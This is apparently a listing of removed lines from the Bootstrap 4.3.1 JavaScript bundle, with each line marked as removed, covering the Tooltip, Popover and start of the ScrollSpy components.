// Removed at line 2407:               offset: this._getOffset(),
// Removed at line 2408:               flip: {
// Removed at line 2409:                 behavior: this.config.fallbackPlacement
// Removed at line 2410:               },
// Removed at line 2411:               arrow: {
// Removed at line 2412:                 element: Selector$6.ARROW
// Removed at line 2413:               },
// Removed at line 2414:               preventOverflow: {
// Removed at line 2415:                 boundariesElement: this.config.boundary
// Removed at line 2416:               }
// Removed at line 2417:             },
// Removed at line 2418:             onCreate: function onCreate(data) {
// Removed at line 2419:               if (data.originalPlacement !== data.placement) {
// Removed at line 2420:                 _this._handlePopperPlacementChange(data);
// Removed at line 2421:               }
// Removed at line 2422:             },
// Removed at line 2423:             onUpdate: function onUpdate(data) {
// Removed at line 2424:               return _this._handlePopperPlacementChange(data);
// Removed at line 2425:             }
// Removed at line 2426:           });
// Removed at line 2427:           $(tip).addClass(ClassName$6.SHOW); // If this is a touch-enabled device we add extra
// Removed at line 2428:           // empty mouseover listeners to the body's immediate children;
// Removed at line 2429:           // only needed because of broken event delegation on iOS
// Removed at line 2430:           // https://www.quirksmode.org/blog/archives/2014/02/mouse_event_bub.html
// Removed at line 2431:           if ('ontouchstart' in document.documentElement) {
// Removed at line 2432:             $(document.body).children().on('mouseover', null, $.noop);
// Removed at line 2433:           }
// Removed at line 2434:           var complete = function complete() {
// Removed at line 2435:             if (_this.config.animation) {
// Removed at line 2436:               _this._fixTransition();
// Removed at line 2437:             }
// Removed at line 2438:             var prevHoverState = _this._hoverState;
// Removed at line 2439:             _this._hoverState = null;
// Removed at line 2440:             $(_this.element).trigger(_this.constructor.Event.SHOWN);
// Removed at line 2441:             if (prevHoverState === HoverState.OUT) {
// Removed at line 2442:               _this._leave(null, _this);
// Removed at line 2443:             }
// Removed at line 2444:           };
// Removed at line 2445:           if ($(this.tip).hasClass(ClassName$6.FADE)) {
// Removed at line 2446:             var transitionDuration = Util.getTransitionDurationFromElement(this.tip);
// Removed at line 2447:             $(this.tip).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
// Removed at line 2448:           } else {
// Removed at line 2449:             complete();
// Removed at line 2450:           }
// Removed at line 2451:         }
// Removed at line 2452:       };
// Removed at line 2453:       _proto.hide = function hide(callback) {
// Removed at line 2454:         var _this2 = this;
// Removed at line 2455:         var tip = this.getTipElement();
// Removed at line 2456:         var hideEvent = $.Event(this.constructor.Event.HIDE);
// Removed at line 2457:         var complete = function complete() {
// Removed at line 2458:           if (_this2._hoverState !== HoverState.SHOW && tip.parentNode) {
// Removed at line 2459:             tip.parentNode.removeChild(tip);
// Removed at line 2460:           }
// Removed at line 2461:           _this2._cleanTipClass();
// Removed at line 2462:           _this2.element.removeAttribute('aria-describedby');
// Removed at line 2463:           $(_this2.element).trigger(_this2.constructor.Event.HIDDEN);
// Removed at line 2464:           if (_this2._popper !== null) {
// Removed at line 2465:             _this2._popper.destroy();
// Removed at line 2466:           }
// Removed at line 2467:           if (callback) {
// Removed at line 2468:             callback();
// Removed at line 2469:           }
// Removed at line 2470:         };
// Removed at line 2471:         $(this.element).trigger(hideEvent);
// Removed at line 2472:         if (hideEvent.isDefaultPrevented()) {
// Removed at line 2473:           return;
// Removed at line 2474:         }
// Removed at line 2475:         $(tip).removeClass(ClassName$6.SHOW); // If this is a touch-enabled device we remove the extra
// Removed at line 2476:         // empty mouseover listeners we added for iOS support
// Removed at line 2477:         if ('ontouchstart' in document.documentElement) {
// Removed at line 2478:           $(document.body).children().off('mouseover', null, $.noop);
// Removed at line 2479:         }
// Removed at line 2480:         this._activeTrigger[Trigger.CLICK] = false;
// Removed at line 2481:         this._activeTrigger[Trigger.FOCUS] = false;
// Removed at line 2482:         this._activeTrigger[Trigger.HOVER] = false;
// Removed at line 2483:         if ($(this.tip).hasClass(ClassName$6.FADE)) {
// Removed at line 2484:           var transitionDuration = Util.getTransitionDurationFromElement(tip);
// Removed at line 2485:           $(tip).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
// Removed at line 2486:         } else {
// Removed at line 2487:           complete();
// Removed at line 2488:         }
// Removed at line 2489:         this._hoverState = '';
// Removed at line 2490:       };
// Removed at line 2491:       _proto.update = function update() {
// Removed at line 2492:         if (this._popper !== null) {
// Removed at line 2493:           this._popper.scheduleUpdate();
// Removed at line 2494:         }
// Removed at line 2495:       } // Protected
// Removed at line 2496:         ;
// Removed at line 2497:       _proto.isWithContent = function isWithContent() {
// Removed at line 2498:         return Boolean(this.getTitle());
// Removed at line 2499:       };
// Removed at line 2500:       _proto.addAttachmentClass = function addAttachmentClass(attachment) {
// Removed at line 2501:         $(this.getTipElement()).addClass(CLASS_PREFIX + "-" + attachment);
// Removed at line 2502:       };
// Removed at line 2503:       _proto.getTipElement = function getTipElement() {
// Removed at line 2504:         this.tip = this.tip || $(this.config.template)[0];
// Removed at line 2505:         return this.tip;
// Removed at line 2506:       };
// Removed at line 2507:       _proto.setContent = function setContent() {
// Removed at line 2508:         var tip = this.getTipElement();
// Removed at line 2509:         this.setElementContent($(tip.querySelectorAll(Selector$6.TOOLTIP_INNER)), this.getTitle());
// Removed at line 2510:         $(tip).removeClass(ClassName$6.FADE + " " + ClassName$6.SHOW);
// Removed at line 2511:       };
// Removed at line 2512:       _proto.setElementContent = function setElementContent($element, content) {
// Removed at line 2513:         if (typeof content === 'object' && (content.nodeType || content.jquery)) {
// Removed at line 2514:           // Content is a DOM node or a jQuery
// Removed at line 2515:           if (this.config.html) {
// Removed at line 2516:             if (!$(content).parent().is($element)) {
// Removed at line 2517:               $element.empty().append(content);
// Removed at line 2518:             }
// Removed at line 2519:           } else {
// Removed at line 2520:             $element.text($(content).text());
// Removed at line 2521:           }
// Removed at line 2522:           return;
// Removed at line 2523:         }
// Removed at line 2524:         if (this.config.html) {
// Removed at line 2525:           if (this.config.sanitize) {
// Removed at line 2526:             content = sanitizeHtml(content, this.config.whiteList, this.config.sanitizeFn);
// Removed at line 2527:           }
// Removed at line 2528:           $element.html(content);
// Removed at line 2529:         } else {
// Removed at line 2530:           $element.text(content);
// Removed at line 2531:         }
// Removed at line 2532:       };
// Removed at line 2533:       _proto.getTitle = function getTitle() {
// Removed at line 2534:         var title = this.element.getAttribute('data-original-title');
// Removed at line 2535:         if (!title) {
// Removed at line 2536:           title = typeof this.config.title === 'function' ? this.config.title.call(this.element) : this.config.title;
// Removed at line 2537:         }
// Removed at line 2538:         return title;
// Removed at line 2539:       } // Private
// Removed at line 2540:         ;
// Removed at line 2541:       _proto._getOffset = function _getOffset() {
// Removed at line 2542:         var _this3 = this;
// Removed at line 2543:         var offset = {};
// Removed at line 2544:         if (typeof this.config.offset === 'function') {
// Removed at line 2545:           offset.fn = function (data) {
// Removed at line 2546:             data.offsets = _objectSpread({}, data.offsets, _this3.config.offset(data.offsets, _this3.element) || {});
// Removed at line 2547:             return data;
// Removed at line 2548:           };
// Removed at line 2549:         } else {
// Removed at line 2550:           offset.offset = this.config.offset;
// Removed at line 2551:         }
// Removed at line 2552:         return offset;
// Removed at line 2553:       };
// Removed at line 2554:       _proto._getContainer = function _getContainer() {
// Removed at line 2555:         if (this.config.container === false) {
// Removed at line 2556:           return document.body;
// Removed at line 2557:         }
// Removed at line 2558:         if (Util.isElement(this.config.container)) {
// Removed at line 2559:           return $(this.config.container);
// Removed at line 2560:         }
// Removed at line 2561:         return $(document).find(this.config.container);
// Removed at line 2562:       };
// Removed at line 2563:       _proto._getAttachment = function _getAttachment(placement) {
// Removed at line 2564:         return AttachmentMap$1[placement.toUpperCase()];
// Removed at line 2565:       };
// Removed at line 2566:       _proto._setListeners = function _setListeners() {
// Removed at line 2567:         var _this4 = this;
// Removed at line 2568:         var triggers = this.config.trigger.split(' ');
// Removed at line 2569:         triggers.forEach(function (trigger) {
// Removed at line 2570:           if (trigger === 'click') {
// Removed at line 2571:             $(_this4.element).on(_this4.constructor.Event.CLICK, _this4.config.selector, function (event) {
// Removed at line 2572:               return _this4.toggle(event);
// Removed at line 2573:             });
// Removed at line 2574:           } else if (trigger !== Trigger.MANUAL) {
// Removed at line 2575:             var eventIn = trigger === Trigger.HOVER ? _this4.constructor.Event.MOUSEENTER : _this4.constructor.Event.FOCUSIN;
// Removed at line 2576:             var eventOut = trigger === Trigger.HOVER ? _this4.constructor.Event.MOUSELEAVE : _this4.constructor.Event.FOCUSOUT;
// Removed at line 2577:             $(_this4.element).on(eventIn, _this4.config.selector, function (event) {
// Removed at line 2578:               return _this4._enter(event);
// Removed at line 2579:             }).on(eventOut, _this4.config.selector, function (event) {
// Removed at line 2580:               return _this4._leave(event);
// Removed at line 2581:             });
// Removed at line 2582:           }
// Removed at line 2583:         });
// Removed at line 2584:         $(this.element).closest('.modal').on('hide.bs.modal', function () {
// Removed at line 2585:           if (_this4.element) {
// Removed at line 2586:             _this4.hide();
// Removed at line 2587:           }
// Removed at line 2588:         });
// Removed at line 2589:         if (this.config.selector) {
// Removed at line 2590:           this.config = _objectSpread({}, this.config, {
// Removed at line 2591:             trigger: 'manual',
// Removed at line 2592:             selector: ''
// Removed at line 2593:           });
// Removed at line 2594:         } else {
// Removed at line 2595:           this._fixTitle();
// Removed at line 2596:         }
// Removed at line 2597:       };
// Removed at line 2598:       _proto._fixTitle = function _fixTitle() {
// Removed at line 2599:         var titleType = typeof this.element.getAttribute('data-original-title');
// Removed at line 2600:         if (this.element.getAttribute('title') || titleType !== 'string') {
// Removed at line 2601:           this.element.setAttribute('data-original-title', this.element.getAttribute('title') || '');
// Removed at line 2602:           this.element.setAttribute('title', '');
// Removed at line 2603:         }
// Removed at line 2604:       };
// Removed at line 2605:       _proto._enter = function _enter(event, context) {
// Removed at line 2606:         var dataKey = this.constructor.DATA_KEY;
// Removed at line 2607:         context = context || $(event.currentTarget).data(dataKey);
// Removed at line 2608:         if (!context) {
// Removed at line 2609:           context = new this.constructor(event.currentTarget, this._getDelegateConfig());
// Removed at line 2610:           $(event.currentTarget).data(dataKey, context);
// Removed at line 2611:         }
// Removed at line 2612:         if (event) {
// Removed at line 2613:           context._activeTrigger[event.type === 'focusin' ? Trigger.FOCUS : Trigger.HOVER] = true;
// Removed at line 2614:         }
// Removed at line 2615:         if ($(context.getTipElement()).hasClass(ClassName$6.SHOW) || context._hoverState === HoverState.SHOW) {
// Removed at line 2616:           context._hoverState = HoverState.SHOW;
// Removed at line 2617:           return;
// Removed at line 2618:         }
// Removed at line 2619:         clearTimeout(context._timeout);
// Removed at line 2620:         context._hoverState = HoverState.SHOW;
// Removed at line 2621:         if (!context.config.delay || !context.config.delay.show) {
// Removed at line 2622:           context.show();
// Removed at line 2623:           return;
// Removed at line 2624:         }
// Removed at line 2625:         context._timeout = setTimeout(function () {
// Removed at line 2626:           if (context._hoverState === HoverState.SHOW) {
// Removed at line 2627:             context.show();
// Removed at line 2628:           }
// Removed at line 2629:         }, context.config.delay.show);
// Removed at line 2630:       };
// Removed at line 2631:       _proto._leave = function _leave(event, context) {
// Removed at line 2632:         var dataKey = this.constructor.DATA_KEY;
// Removed at line 2633:         context = context || $(event.currentTarget).data(dataKey);
// Removed at line 2634:         if (!context) {
// Removed at line 2635:           context = new this.constructor(event.currentTarget, this._getDelegateConfig());
// Removed at line 2636:           $(event.currentTarget).data(dataKey, context);
// Removed at line 2637:         }
// Removed at line 2638:         if (event) {
// Removed at line 2639:           context._activeTrigger[event.type === 'focusout' ? Trigger.FOCUS : Trigger.HOVER] = false;
// Removed at line 2640:         }
// Removed at line 2641:         if (context._isWithActiveTrigger()) {
// Removed at line 2642:           return;
// Removed at line 2643:         }
// Removed at line 2644:         clearTimeout(context._timeout);
// Removed at line 2645:         context._hoverState = HoverState.OUT;
// Removed at line 2646:         if (!context.config.delay || !context.config.delay.hide) {
// Removed at line 2647:           context.hide();
// Removed at line 2648:           return;
// Removed at line 2649:         }
// Removed at line 2650:         context._timeout = setTimeout(function () {
// Removed at line 2651:           if (context._hoverState === HoverState.OUT) {
// Removed at line 2652:             context.hide();
// Removed at line 2653:           }
// Removed at line 2654:         }, context.config.delay.hide);
// Removed at line 2655:       };
// Removed at line 2656:       _proto._isWithActiveTrigger = function _isWithActiveTrigger() {
// Removed at line 2657:         for (var trigger in this._activeTrigger) {
// Removed at line 2658:           if (this._activeTrigger[trigger]) {
// Removed at line 2659:             return true;
// Removed at line 2660:           }
// Removed at line 2661:         }
// Removed at line 2662:         return false;
// Removed at line 2663:       };
// Removed at line 2664:       _proto._getConfig = function _getConfig(config) {
// Removed at line 2665:         var dataAttributes = $(this.element).data();
// Removed at line 2666:         Object.keys(dataAttributes).forEach(function (dataAttr) {
// Removed at line 2667:           if (DISALLOWED_ATTRIBUTES.indexOf(dataAttr) !== -1) {
// Removed at line 2668:             delete dataAttributes[dataAttr];
// Removed at line 2669:           }
// Removed at line 2670:         });
// Removed at line 2671:         config = _objectSpread({}, this.constructor.Default, dataAttributes, typeof config === 'object' && config ? config : {});
// Removed at line 2672:         if (typeof config.delay === 'number') {
// Removed at line 2673:           config.delay = {
// Removed at line 2674:             show: config.delay,
// Removed at line 2675:             hide: config.delay
// Removed at line 2676:           };
// Removed at line 2677:         }
// Removed at line 2678:         if (typeof config.title === 'number') {
// Removed at line 2679:           config.title = config.title.toString();
// Removed at line 2680:         }
// Removed at line 2681:         if (typeof config.content === 'number') {
// Removed at line 2682:           config.content = config.content.toString();
// Removed at line 2683:         }
// Removed at line 2684:         Util.typeCheckConfig(NAME$6, config, this.constructor.DefaultType);
// Removed at line 2685:         if (config.sanitize) {
// Removed at line 2686:           config.template = sanitizeHtml(config.template, config.whiteList, config.sanitizeFn);
// Removed at line 2687:         }
// Removed at line 2688:         return config;
// Removed at line 2689:       };
// Removed at line 2690:       _proto._getDelegateConfig = function _getDelegateConfig() {
// Removed at line 2691:         var config = {};
// Removed at line 2692:         if (this.config) {
// Removed at line 2693:           for (var key in this.config) {
// Removed at line 2694:             if (this.constructor.Default[key] !== this.config[key]) {
// Removed at line 2695:               config[key] = this.config[key];
// Removed at line 2696:             }
// Removed at line 2697:           }
// Removed at line 2698:         }
// Removed at line 2699:         return config;
// Removed at line 2700:       };
// Removed at line 2701:       _proto._cleanTipClass = function _cleanTipClass() {
// Removed at line 2702:         var $tip = $(this.getTipElement());
// Removed at line 2703:         var tabClass = $tip.attr('class').match(BSCLS_PREFIX_REGEX);
// Removed at line 2704:         if (tabClass !== null && tabClass.length) {
// Removed at line 2705:           $tip.removeClass(tabClass.join(''));
// Removed at line 2706:         }
// Removed at line 2707:       };
// Removed at line 2708:       _proto._handlePopperPlacementChange = function _handlePopperPlacementChange(popperData) {
// Removed at line 2709:         var popperInstance = popperData.instance;
// Removed at line 2710:         this.tip = popperInstance.popper;
// Removed at line 2711:         this._cleanTipClass();
// Removed at line 2712:         this.addAttachmentClass(this._getAttachment(popperData.placement));
// Removed at line 2713:       };
// Removed at line 2714:       _proto._fixTransition = function _fixTransition() {
// Removed at line 2715:         var tip = this.getTipElement();
// Removed at line 2716:         var initConfigAnimation = this.config.animation;
// Removed at line 2717:         if (tip.getAttribute('x-placement') !== null) {
// Removed at line 2718:           return;
// Removed at line 2719:         }
// Removed at line 2720:         $(tip).removeClass(ClassName$6.FADE);
// Removed at line 2721:         this.config.animation = false;
// Removed at line 2722:         this.hide();
// Removed at line 2723:         this.show();
// Removed at line 2724:         this.config.animation = initConfigAnimation;
// Removed at line 2725:       } // Static
// Removed at line 2726:         ;
// Removed at line 2727:       Tooltip._jQueryInterface = function _jQueryInterface(config) {
// Removed at line 2728:         return this.each(function () {
// Removed at line 2729:           var data = $(this).data(DATA_KEY$6);
// Removed at line 2730:           var _config = typeof config === 'object' && config;
// Removed at line 2731:           if (!data && /dispose|hide/.test(config)) {
// Removed at line 2732:             return;
// Removed at line 2733:           }
// Removed at line 2734:           if (!data) {
// Removed at line 2735:             data = new Tooltip(this, _config);
// Removed at line 2736:             $(this).data(DATA_KEY$6, data);
// Removed at line 2737:           }
// Removed at line 2738:           if (typeof config === 'string') {
// Removed at line 2739:             if (typeof data[config] === 'undefined') {
// Removed at line 2740:               throw new TypeError("No method named \"" + config + "\"");
// Removed at line 2741:             }
// Removed at line 2742:             data[config]();
// Removed at line 2743:           }
// Removed at line 2744:         });
// Removed at line 2745:       };
// Removed at line 2746:       _createClass(Tooltip, null, [{
// Removed at line 2747:         key: "VERSION",
// Removed at line 2748:         get: function get() {
// Removed at line 2749:           return VERSION$6;
// Removed at line 2750:         }
// Removed at line 2751:       }, {
// Removed at line 2752:         key: "Default",
// Removed at line 2753:         get: function get() {
// Removed at line 2754:           return Default$4;
// Removed at line 2755:         }
// Removed at line 2756:       }, {
// Removed at line 2757:         key: "NAME",
// Removed at line 2758:         get: function get() {
// Removed at line 2759:           return NAME$6;
// Removed at line 2760:         }
// Removed at line 2761:       }, {
// Removed at line 2762:         key: "DATA_KEY",
// Removed at line 2763:         get: function get() {
// Removed at line 2764:           return DATA_KEY$6;
// Removed at line 2765:         }
// Removed at line 2766:       }, {
// Removed at line 2767:         key: "Event",
// Removed at line 2768:         get: function get() {
// Removed at line 2769:           return Event$6;
// Removed at line 2770:         }
// Removed at line 2771:       }, {
// Removed at line 2772:         key: "EVENT_KEY",
// Removed at line 2773:         get: function get() {
// Removed at line 2774:           return EVENT_KEY$6;
// Removed at line 2775:         }
// Removed at line 2776:       }, {
// Removed at line 2777:         key: "DefaultType",
// Removed at line 2778:         get: function get() {
// Removed at line 2779:           return DefaultType$4;
// Removed at line 2780:         }
// Removed at line 2781:       }]);
// Removed at line 2782:       return Tooltip;
// Removed at line 2783:     }();
// Removed at line 2784:   /**
// Removed at line 2785:    * ------------------------------------------------------------------------
// Removed at line 2786:    * jQuery
// Removed at line 2787:    * ------------------------------------------------------------------------
// Removed at line 2788:    */
// Removed at line 2789:   $.fn[NAME$6] = Tooltip._jQueryInterface;
// Removed at line 2790:   $.fn[NAME$6].Constructor = Tooltip;
// Removed at line 2791:   $.fn[NAME$6].noConflict = function () {
// Removed at line 2792:     $.fn[NAME$6] = JQUERY_NO_CONFLICT$6;
// Removed at line 2793:     return Tooltip._jQueryInterface;
// Removed at line 2794:   };
// Removed at line 2795:   /**
// Removed at line 2796:    * ------------------------------------------------------------------------
// Removed at line 2797:    * Constants
// Removed at line 2798:    * ------------------------------------------------------------------------
// Removed at line 2799:    */
// Removed at line 2800:   var NAME$7 = 'popover';
// Removed at line 2801:   var VERSION$7 = '4.3.1';
// Removed at line 2802:   var DATA_KEY$7 = 'bs.popover';
// Removed at line 2803:   var EVENT_KEY$7 = "." + DATA_KEY$7;
// Removed at line 2804:   var JQUERY_NO_CONFLICT$7 = $.fn[NAME$7];
// Removed at line 2805:   var CLASS_PREFIX$1 = 'bs-popover';
// Removed at line 2806:   var BSCLS_PREFIX_REGEX$1 = new RegExp("(^|\\s)" + CLASS_PREFIX$1 + "\\S+", 'g');
// Removed at line 2807:   var Default$5 = _objectSpread({}, Tooltip.Default, {
// Removed at line 2808:     placement: 'right',
// Removed at line 2809:     trigger: 'click',
// Removed at line 2810:     content: '',
// Removed at line 2811:     template: '<div class="popover" role="tooltip">' + '<div class="arrow"></div>' + '<h3 class="popover-header"></h3>' + '<div class="popover-body"></div></div>'
// Removed at line 2812:   });
// Removed at line 2813:   var DefaultType$5 = _objectSpread({}, Tooltip.DefaultType, {
// Removed at line 2814:     content: '(string|element|function)'
// Removed at line 2815:   });
// Removed at line 2816:   var ClassName$7 = {
// Removed at line 2817:     FADE: 'fade',
// Removed at line 2818:     SHOW: 'show'
// Removed at line 2819:   };
// Removed at line 2820:   var Selector$7 = {
// Removed at line 2821:     TITLE: '.popover-header',
// Removed at line 2822:     CONTENT: '.popover-body'
// Removed at line 2823:   };
// Removed at line 2824:   var Event$7 = {
// Removed at line 2825:     HIDE: "hide" + EVENT_KEY$7,
// Removed at line 2826:     HIDDEN: "hidden" + EVENT_KEY$7,
// Removed at line 2827:     SHOW: "show" + EVENT_KEY$7,
// Removed at line 2828:     SHOWN: "shown" + EVENT_KEY$7,
// Removed at line 2829:     INSERTED: "inserted" + EVENT_KEY$7,
// Removed at line 2830:     CLICK: "click" + EVENT_KEY$7,
// Removed at line 2831:     FOCUSIN: "focusin" + EVENT_KEY$7,
// Removed at line 2832:     FOCUSOUT: "focusout" + EVENT_KEY$7,
// Removed at line 2833:     MOUSEENTER: "mouseenter" + EVENT_KEY$7,
// Removed at line 2834:     MOUSELEAVE: "mouseleave" + EVENT_KEY$7
// Removed at line 2835:     /**
// Removed at line 2836:      * ------------------------------------------------------------------------
// Removed at line 2837:      * Class Definition
// Removed at line 2838:      * ------------------------------------------------------------------------
// Removed at line 2839:      */
// Removed at line 2840:   };
// Removed at line 2841:   var Popover =
// Removed at line 2842:     /*#__PURE__*/
// Removed at line 2843:     function (_Tooltip) {
// Removed at line 2844:       _inheritsLoose(Popover, _Tooltip);
// Removed at line 2845:       function Popover() {
// Removed at line 2846:         return _Tooltip.apply(this, arguments) || this;
// Removed at line 2847:       }
// Removed at line 2848:       var _proto = Popover.prototype;
// Removed at line 2849:       // Overrides
// Removed at line 2850:       _proto.isWithContent = function isWithContent() {
// Removed at line 2851:         return this.getTitle() || this._getContent();
// Removed at line 2852:       };
// Removed at line 2853:       _proto.addAttachmentClass = function addAttachmentClass(attachment) {
// Removed at line 2854:         $(this.getTipElement()).addClass(CLASS_PREFIX$1 + "-" + attachment);
// Removed at line 2855:       };
// Removed at line 2856:       _proto.getTipElement = function getTipElement() {
// Removed at line 2857:         this.tip = this.tip || $(this.config.template)[0];
// Removed at line 2858:         return this.tip;
// Removed at line 2859:       };
// Removed at line 2860:       _proto.setContent = function setContent() {
// Removed at line 2861:         var $tip = $(this.getTipElement()); // We use append for html objects to maintain js events
// Removed at line 2862:         this.setElementContent($tip.find(Selector$7.TITLE), this.getTitle());
// Removed at line 2863:         var content = this._getContent();
// Removed at line 2864:         if (typeof content === 'function') {
// Removed at line 2865:           content = content.call(this.element);
// Removed at line 2866:         }
// Removed at line 2867:         this.setElementContent($tip.find(Selector$7.CONTENT), content);
// Removed at line 2868:         $tip.removeClass(ClassName$7.FADE + " " + ClassName$7.SHOW);
// Removed at line 2869:       } // Private
// Removed at line 2870:         ;
// Removed at line 2871:       _proto._getContent = function _getContent() {
// Removed at line 2872:         return this.element.getAttribute('data-content') || this.config.content;
// Removed at line 2873:       };
// Removed at line 2874:       _proto._cleanTipClass = function _cleanTipClass() {
// Removed at line 2875:         var $tip = $(this.getTipElement());
// Removed at line 2876:         var tabClass = $tip.attr('class').match(BSCLS_PREFIX_REGEX$1);
// Removed at line 2877:         if (tabClass !== null && tabClass.length > 0) {
// Removed at line 2878:           $tip.removeClass(tabClass.join(''));
// Removed at line 2879:         }
// Removed at line 2880:       } // Static
// Removed at line 2881:         ;
// Removed at line 2882:       Popover._jQueryInterface = function _jQueryInterface(config) {
// Removed at line 2883:         return this.each(function () {
// Removed at line 2884:           var data = $(this).data(DATA_KEY$7);
// Removed at line 2885:           var _config = typeof config === 'object' ? config : null;
// Removed at line 2886:           if (!data && /dispose|hide/.test(config)) {
// Removed at line 2887:             return;
// Removed at line 2888:           }
// Removed at line 2889:           if (!data) {
// Removed at line 2890:             data = new Popover(this, _config);
// Removed at line 2891:             $(this).data(DATA_KEY$7, data);
// Removed at line 2892:           }
// Removed at line 2893:           if (typeof config === 'string') {
// Removed at line 2894:             if (typeof data[config] === 'undefined') {
// Removed at line 2895:               throw new TypeError("No method named \"" + config + "\"");
// Removed at line 2896:             }
// Removed at line 2897:             data[config]();
// Removed at line 2898:           }
// Removed at line 2899:         });
// Removed at line 2900:       };
// Removed at line 2901:       _createClass(Popover, null, [{
// Removed at line 2902:         key: "VERSION",
// Removed at line 2903:         // Getters
// Removed at line 2904:         get: function get() {
// Removed at line 2905:           return VERSION$7;
// Removed at line 2906:         }
// Removed at line 2907:       }, {
// Removed at line 2908:         key: "Default",
// Removed at line 2909:         get: function get() {
// Removed at line 2910:           return Default$5;
// Removed at line 2911:         }
// Removed at line 2912:       }, {
// Removed at line 2913:         key: "NAME",
// Removed at line 2914:         get: function get() {
// Removed at line 2915:           return NAME$7;
// Removed at line 2916:         }
// Removed at line 2917:       }, {
// Removed at line 2918:         key: "DATA_KEY",
// Removed at line 2919:         get: function get() {
// Removed at line 2920:           return DATA_KEY$7;
// Removed at line 2921:         }
// Removed at line 2922:       }, {
// Removed at line 2923:         key: "Event",
// Removed at line 2924:         get: function get() {
// Removed at line 2925:           return Event$7;
// Removed at line 2926:         }
// Removed at line 2927:       }, {
// Removed at line 2928:         key: "EVENT_KEY",
// Removed at line 2929:         get: function get() {
// Removed at line 2930:           return EVENT_KEY$7;
// Removed at line 2931:         }
// Removed at line 2932:       }, {
// Removed at line 2933:         key: "DefaultType",
// Removed at line 2934:         get: function get() {
// Removed at line 2935:           return DefaultType$5;
// Removed at line 2936:         }
// Removed at line 2937:       }]);
// Removed at line 2938:       return Popover;
// Removed at line 2939:     }(Tooltip);
// Removed at line 2940:   /**
// Removed at line 2941:    * ------------------------------------------------------------------------
// Removed at line 2942:    * jQuery
// Removed at line 2943:    * ------------------------------------------------------------------------
// Removed at line 2944:    */
// Removed at line 2945:   $.fn[NAME$7] = Popover._jQueryInterface;
// Removed at line 2946:   $.fn[NAME$7].Constructor = Popover;
// Removed at line 2947:   $.fn[NAME$7].noConflict = function () {
// Removed at line 2948:     $.fn[NAME$7] = JQUERY_NO_CONFLICT$7;
// Removed at line 2949:     return Popover._jQueryInterface;
// Removed at line 2950:   };
// Removed at line 2951:   /**
// Removed at line 2952:    * ------------------------------------------------------------------------
// Removed at line 2953:    * Constants
// Removed at line 2954:    * ------------------------------------------------------------------------
// Removed at line 2955:    */
// Removed at line 2956:   var NAME$8 = 'scrollspy';
// Removed at line 2957:   var VERSION$8 = '4.3.1';
// Removed at line 2958:   var DATA_KEY$8 = 'bs.scrollspy';
// Removed at line 2959:   var EVENT_KEY$8 = "." + DATA_KEY$8;
// Removed at line 2960:   var DATA_API_KEY$6 = '.data-api';
// Removed at line 2961:   var JQUERY_NO_CONFLICT$8 = $.fn[NAME$8];
// Removed at line 2962:   var Default$6 = {
// Removed at line 2963:     offset: 10,
// Removed at line 2964:     method: 'auto',
// Removed at line 2965:     target: ''
// Removed at line 2966:   };
// Removed at line 2967:   var DefaultType$6 = {
// Removed at line 2968:     offset: 'number',
// Removed at line 2969:     method: 'string',
// Removed at line 2970:     target: '(string|element)'
// Removed at line 2971:   };
// Removed at line 2972:   var Event$8 = {
// Removed at line 2973:     ACTIVATE: "activate" + EVENT_KEY$8,
// Removed at line 2974:     SCROLL: "scroll" + EVENT_KEY$8,
// Removed at line 2975:     LOAD_DATA_API: "load" + EVENT_KEY$8 + DATA_API_KEY$6
// Removed at line 2976:   };
// Removed at line 2977:   var ClassName$8 = {
// Removed at line 2978:     DROPDOWN_ITEM: 'dropdown-item',
// Removed at line 2979:     DROPDOWN_MENU: 'dropdown-menu',
// Removed at line 2980:     ACTIVE: 'active'
// Removed at line 2981:   };
// Removed at line 2982:   var Selector$8 = {
// Removed at line 2983:     DATA_SPY: '[data-spy="scroll"]',
// Removed at line 2984:     ACTIVE: '.active',
// Removed at line 2985:     NAV_LIST_GROUP: '.nav, .list-group',
// Removed at line 2986:     NAV_LINKS: '.nav-link',
// Removed at line 2987:     NAV_ITEMS: '.nav-item',
// Removed at line 2988:     LIST_ITEMS: '.list-group-item',
// Removed at line 2989:     DROPDOWN: '.dropdown',
// Removed at line 2990:     DROPDOWN_ITEMS: '.dropdown-item',
// Removed at line 2991:     DROPDOWN_TOGGLE: '.dropdown-toggle'
// Removed at line 2992:   };
// Removed at line 2993:   var OffsetMethod = {
// Removed at line 2994:     OFFSET: 'offset',
// Removed at line 2995:     POSITION: 'position'
// Removed at line 2996:     /**
// Removed at line 2997:      * ------------------------------------------------------------------------
// Removed at line 2998:      * Class Definition
// Removed at line 2999:      * ------------------------------------------------------------------------
// Removed at line 3000:      */
// Removed at line 3001:   };
// Removed at line 3002:   var ScrollSpy =
// Removed at line 3003:     /*#__PURE__*/
// Removed at line 3004:     function () {
// Removed at line 3005:       function ScrollSpy(element, config) {
// Removed at line 3006:         var _this = this;
// Removed at line 3007:         this._element = element;
// Removed at line 3008:         this._scrollElement = element.tagName === 'BODY' ? window : element;
// Removed at line 3009:         this._config = this._getConfig(config);
// Removed at line 3010:         this._selector = this._config.target + " " + Selector$8.NAV_LINKS + "," + (this._config.target + " " + Selector$8.LIST_ITEMS + ",") + (this._config.target + " " + Selector$8.DROPDOWN_ITEMS);
// Removed at line 3011:         this._offsets = [];
// Removed at line 3012:         this._targets = [];
// Removed at line 3013:         this._activeTarget = null;
// Removed at line 3014:         this._scrollHeight = 0;
// Removed at line 3015:         $(this._scrollElement).on(Event$8.SCROLL, function (event) {
// Removed at line 3016:           return _this._process(event);
// Removed at line 3017:         });
// Removed at line 3018:         this.refresh();
// Removed at line 3019:         this._process();
// Removed at line 3020:       } // Getters
// Removed at line 3021:       var _proto = ScrollSpy.prototype;
// Removed at line 3022:       // Public
// Removed at line 3023:       _proto.refresh = function refresh() {
// Removed at line 3024:         var _this2 = this;
// Removed at line 3025:         var autoMethod = this._scrollElement === this._scrollElement.window ? OffsetMethod.OFFSET : OffsetMethod.POSITION;
// Removed at line 3026:         var offsetMethod = this._config.method === 'auto' ? autoMethod : this._config.method;
// Removed at line 3027:         var offsetBase = offsetMethod === OffsetMethod.POSITION ? this._getScrollTop() : 0;
// Removed at line 3028:         this._offsets = [];
// Removed at line 3029:         this._targets = [];
// Removed at line 3030:         this._scrollHeight = this._getScrollHeight();
// Removed at line 3031:         var targets = [].slice.call(document.querySelectorAll(this._selector));
// Removed at line 3032:         targets.map(function (element) {
// Removed at line 3033:           var target;
